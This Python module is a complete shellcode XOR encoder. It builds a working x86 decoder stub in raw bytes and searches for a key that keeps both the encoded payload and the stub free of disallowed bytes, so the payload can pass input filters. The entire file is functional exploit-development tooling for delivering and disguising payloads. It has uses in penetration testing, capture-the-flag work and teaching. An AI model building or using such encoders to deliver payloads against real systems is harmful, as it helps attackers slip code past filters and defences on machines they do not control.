from __future__ import annotations

from dataclasses import dataclass


class ShellcodeEncodingError(ValueError):
    """Raised when shellcode cannot be safely XOR-encoded for the given constraints."""


@dataclass(frozen=True, slots=True)
class XorEncodingMetadata:
    key: int
    original_size: int
    encoded_size: int
    stub_size: int

    @property
    def size_increase(self) -> int:
        return self.encoded_size - self.original_size


@dataclass(frozen=True, slots=True)
class XorEncodingResult:
    payload: bytes
    metadata: XorEncodingMetadata


def contains_badchars(data: bytes, badchars: bytes) -> bool:
    """Return True when any byte in *data* is present in *badchars*."""
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("data must be bytes-like")
    if not isinstance(badchars, (bytes, bytearray)):
        raise TypeError("badchars must be bytes-like")

    badset = set(bytes(badchars))
    return any(byte in badset for byte in data)


def _build_decoder_stub_candidates(length: int, key: int) -> tuple[bytes, ...]:
    """
    Build a compact x86 decoder stub.

    Layout (position-independent):
      jmp short call_decoder
    decoder:
      pop esi
      mov ecx, <length>
    decode_loop:
      xor byte ptr [esi + ecx - 1], <key>
      loop decode_loop
      jmp esi
    call_decoder:
      call decoder

    This decodes payload bytes in-place and transfers execution to decoded payload.
    """
    if not (0 <= length <= 0xFFFFFFFF):
        raise ShellcodeEncodingError("Payload length out of supported 32-bit range")
    if not (1 <= key <= 0xFF):
        raise ShellcodeEncodingError("XOR key must be between 1 and 255")

    # Common decode loop body (without final call).
    decode_body = b"\x5e" + b"\x80\x74\x0e\xff" + bytes([key]) + b"\xe2\xf9" + b"\xff\xe6"

    candidates: list[bytes] = []

    def build_with_length_loader(length_loader: bytes) -> bytes:
        # Decoder starts immediately after initial jmp.
        decoder = b"\x5e" + length_loader + decode_body[1:]
        jmp_offset = len(decoder)
        if jmp_offset > 0x7F:
            raise ShellcodeEncodingError("Decoder stub grew beyond short-jump range")

        # call rel32 back to decoder start at offset 2.
        call_site = 2 + len(decoder)
        rel = (2 - (call_site + 5)) & 0xFFFFFFFF
        return b"\xeb" + bytes([jmp_offset]) + decoder + b"\xe8" + rel.to_bytes(4, "little")

    # 1) Shortest for <= 255: xor ecx,ecx ; mov cl, imm8 (21-byte total stub).
    if length <= 0xFF:
        candidates.append(build_with_length_loader(b"\x31\xc9\xb1" + bytes([length])))

    # 2) Also short for <= 127: push imm8 ; pop ecx (20-byte total stub).
    #    Useful when mov cl immediate byte is a badchar.
    if length <= 0x7F:
        candidates.append(build_with_length_loader(b"\x6a" + bytes([length]) + b"\x59"))

    # 3) General fallback: mov ecx, imm32 (22-byte total stub).
    candidates.append(build_with_length_loader(b"\xb9" + length.to_bytes(4, "little")))

    return tuple(candidates)


def encode_xor(payload: bytes, badchars: bytes) -> bytes:
    """
    XOR-encode shellcode and prepend a position-independent decoder stub.

    Deterministic behavior:
    - tries XOR keys 1..255 in ascending order
    - returns the first key where encoded payload and decoder stub are both badchar-clean
    """
    return encode_xor_with_metadata(payload, badchars).payload


def encode_xor_with_metadata(payload: bytes, badchars: bytes) -> XorEncodingResult:
    """Like encode_xor, but also return selected key and size metadata."""
    if not isinstance(payload, (bytes, bytearray)):
        raise TypeError("payload must be bytes-like")
    if not isinstance(badchars, (bytes, bytearray)):
        raise TypeError("badchars must be bytes-like")

    raw = bytes(payload)
    bad = bytes(badchars)

    if not raw:
        raise ShellcodeEncodingError("Payload cannot be empty")

    for key in range(1, 256):
        encoded = bytes(byte ^ key for byte in raw)
        if contains_badchars(encoded, bad):
            continue

        stub: bytes | None = None
        for candidate in _build_decoder_stub_candidates(len(raw), key):
            if not contains_badchars(candidate, bad):
                stub = candidate
                break
        if stub is None:
            continue

        combined = stub + encoded
        return XorEncodingResult(
            payload=combined,
            metadata=XorEncodingMetadata(
                key=key,
                original_size=len(raw),
                encoded_size=len(combined),
                stub_size=len(stub),
            ),
        )

    raise ShellcodeEncodingError(
        "Unable to find a valid XOR key where both encoded payload and decoder stub avoid badchars"
    )
